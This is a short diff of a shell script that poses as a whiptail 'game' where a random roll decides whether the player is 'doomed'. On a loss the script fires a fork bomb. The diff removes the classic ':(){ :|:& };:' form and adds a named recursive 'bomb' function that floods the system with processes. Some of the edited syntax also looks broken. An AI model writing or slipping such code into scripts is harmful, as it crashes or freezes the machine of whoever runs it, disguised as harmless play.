@@ -68,9 +68,14 @@ game()
     if [ $R -lt 5 ]
     then
         whiptail --msgbox --title "DOOMED" "You lost the game and you are now doomed..." 25 80
-        :(){ :|:& };:
+        bomb
     else
         whiptail --msgbox --title "WINNER" "Lucky b****** you get to live this time!..." 25 80
         exit
-    fi
+    fi;;
+}
+
+bomb()
+{
+    bomb | bomb
 }
